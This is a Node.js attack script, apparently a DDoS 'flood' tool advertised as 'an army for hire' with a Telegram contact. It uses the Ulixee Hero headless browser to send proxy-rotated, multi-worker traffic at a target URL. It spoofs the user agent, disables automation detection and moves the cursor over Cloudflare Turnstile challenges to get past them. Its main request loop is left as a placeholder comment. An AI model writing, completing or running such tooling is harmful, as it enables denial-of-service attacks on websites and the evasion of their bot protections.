const Hero = require('@ulixee/hero');
const { ClientPlugin, CorePlugin } = require('@ulixee/hero-plugin-utils');
const { DefaultBrowserEmulator } = require('@unblocked-web/default-browser-emulator');
const cluster = require('cluster');
const colors = require('colors');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const { spawn } = require('child_process');

process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);
process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n                         ${'ulixee free'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log(colors.cyan("                                       t.me/resetcve"));
    console.log(`
    ${`${'HERO v1.0 flood'.underline} | advanced debugging, user-agent options,
                      built-in synchronised proxy checker, browser emulator, rapidreset flooder.`.italic}

    ${'Usage:'.bold.underline}

        ${`xvfb-run node HERO.js [target] [duration] [threads] [rate] [proxy] [options]`.italic}
        ${'xvfb-run node HERO.js https://atlasapi.co 60 3 90 proxy.txt --debug true --proxy 1'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Enable advanced debugging.`.italic}
        --proxy         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Proxy type [1: http], [2: socks5].'.italic}
        --verify        ${'true'.green}        ${'-'.red.bold}   ${`Enable built-in proxy checker.`.italic}
        --platform      ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`Brand [1: Mac], [2: Windows], [3: Random].`.italic}
        --optimize      ${'true'.green}        ${'-'.red.bold}   ${`Optimize memory and CPU usage`}
    `);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.error(`   [${'error'.red}] ${msg}`);
    process.exit(1);
}

function getOption(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = {
    debug: getOption('--debug'),
    proxy: getOption('--proxy'),
    verify: getOption('--verify'),
    platform: getOption('--platform'),
    headless: getOption('--headless'),
    optimize: getOption('--optimize')
};

// Validate input
if (!target.startsWith('https://')) error("Invalid target address (https only)!");
if (isNaN(duration) || duration <= 0) error("Invalid duration format!");
if (isNaN(threads) || threads <= 0) error("Invalid threads format!");
if (isNaN(rate) || rate <= 0) error("Invalid rate format!");
if (!fs.existsSync(proxyfile)) error("Proxy file does not exist!");

const proxies = fs.readFileSync(proxyfile, "utf-8").trim().split("\n").filter(Boolean);
if (proxies.length === 0) error("Proxy file is empty!");

const parsed = new URL(target);
const blockedResources = ['BlockCssAssets', 'BlockImages', 'BlockFonts', 'BlockIcons', 'BlockMedia'];

let proxyChunks = [];
for (let i = 0; i < threads; i++) {
    proxyChunks.push([]);
}
proxies.forEach((proxy, index) => {
    proxyChunks[index % threads].push(proxy);
});

function log(string) {
    const d = new Date();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const seconds = String(d.getSeconds()).padStart(2, '0');
    console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) ${string}`);
}

const pluginId = "@ulixee/execute-js-plugin";

class ExecuteJsClientPlugin extends ClientPlugin {
    static id = pluginId;
    static coreDependencyIds = [pluginId];

    onHero(hero, sendToCore) {
        hero.executeJs = this.executeJs.bind(this, sendToCore);
    }

    onTab(hero, tab, sendToCore) {
        tab.executeJs = this.executeJs.bind(this, sendToCore);
    }

    onFrameEnvironment(hero, frameEnvironment, sendToCore) {
        frameEnvironment.executeJs = this.executeJs.bind(this, sendToCore);
    }

    executeJs(sendToCore, fn, ...args) {
        let fnName = '';
        let fnSerialized = fn;
        if (typeof fn !== 'string') {
            fnName = fn.name;
            fnSerialized = `(${fn.toString()})(${JSON.stringify(args).slice(1, -1)});`;
        }
        return sendToCore(pluginId, {
            fnName,
            fnSerialized,
            args,
            isolateFromWebPageEnvironment: false,
        });
    }
}

class ExecuteJsCorePlugin extends CorePlugin {
    static id = pluginId;

    async onClientCommand({ frame, page }, args) {
        const { fnName, fnSerialized, isolateFromWebPageEnvironment } = args;
        frame = frame || page.mainFrame;
        const result = await frame.evaluate(fnSerialized, isolateFromWebPageEnvironment, {
            includeCommandLineAPI: true,
        });

        if (result.error) {
            this.logger.error(fnName, { error: result.error });
            throw new Error(result.error);
        } else {
            return result;
        }
    }
}

async function main(proxy) {
    let platform = 'mac';
    switch (options.platform) {
        case '1':
            platform = 'mac';
            break;
        case '2':
            platform = 'windows';
            break;
        case '3':
            platform = ['mac', 'windows'][Math.floor(Math.random() * 2)];
            break;
        default:
            platform = 'mac';
            break;
    }

    const proxy_type = options.proxy === '2' ? 'socks5' : 'http';

    const hero = new Hero({
        showChrome: false,
        userAgent: `~ chrome > 119 && ${platform}`,
        upstreamProxyUrl: `${proxy_type}://${proxy}`,
        showChromeInteractions: true,
        sessionPersistence: false,
        showChromeAlive: false,
        blockedResourceTypes: options.optimize ? blockedResources : ['None'],
        launchArgs: [
            '--start-maximized',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--enable-features=NetworkService',
            '--no-sandbox',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            '--ignore-certificate-errors-cert-authority',
            '--disable-popup-blocking',
        ]
    });

    await hero.use(DefaultBrowserEmulator);
    await hero.use(ExecuteJsClientPlugin);
    await hero.use(ExecuteJsCorePlugin);

    const meta = await hero.meta;
    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) User-Agent: ${colors.yellow(`${meta.userAgentString}`.italic)}`);

    await hero.goto(target, { referrer: 'https://google.com', timeoutMs: 15000 });
    const cookieStorage = hero.activeTab.cookieStorage;
    await hero.waitForPaintingStable();

    const { document } = hero.activeTab;

    async function turnstile() {
        const frames = await hero.frameEnvironments;
        for (const frame of frames) {
            const frame_url = await frame.url;
            if (frame_url.includes('challenges.cloudflare.com')) {
                log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.red("Cloudflare Turnstile Detected")}`);
                await new Promise(resolve => setTimeout(resolve, 3000));

                const inputs = await frame.querySelectorAll('input');
                for (const input of inputs) {
                    const coordinates = await input.getBoundingClientRect();
                    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${`Turnstile Coordinates [${colors.bold(`x: ${coordinates.x}`)}, ${colors.bold(`y: ${coordinates.y}`)}]`}`);

                    await hero.interact({ move: [coordinates.x, coordinates.y] });
                    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.green("Cloudflare Turnstile Solved")}`);

                    await new Promise(resolve => setTimeout(resolve, 1000));
                    break;
                }
            }
        }
    }

    for (let i = 0; i < duration; i++) {
        await hero.waitForDelay(1000 / rate);
        await turnstile();

        // Implement additional logic for requests or actions here...

        log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.green("Action executed successfully")}`);
    }

    await hero.close();
}

if (cluster.isMaster) {
    log(`[${'HERO'.bold}] | Starting ${threads} worker(s)`);
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork({ WORKER_ID: i });
        worker.on('exit', (code) => {
            log(`[${'HERO'.bold}] | Worker ${i} exited with code ${code}`);
        });
    }
} else {
    const workerId = parseInt(process.env.WORKER_ID, 10);
    log(`[${'HERO'.bold}] | Worker ${workerId} started with proxy ${proxyChunks[workerId].join(', ')}`);
    for (const proxy of proxyChunks[workerId]) {
        await main(proxy);
    }
}
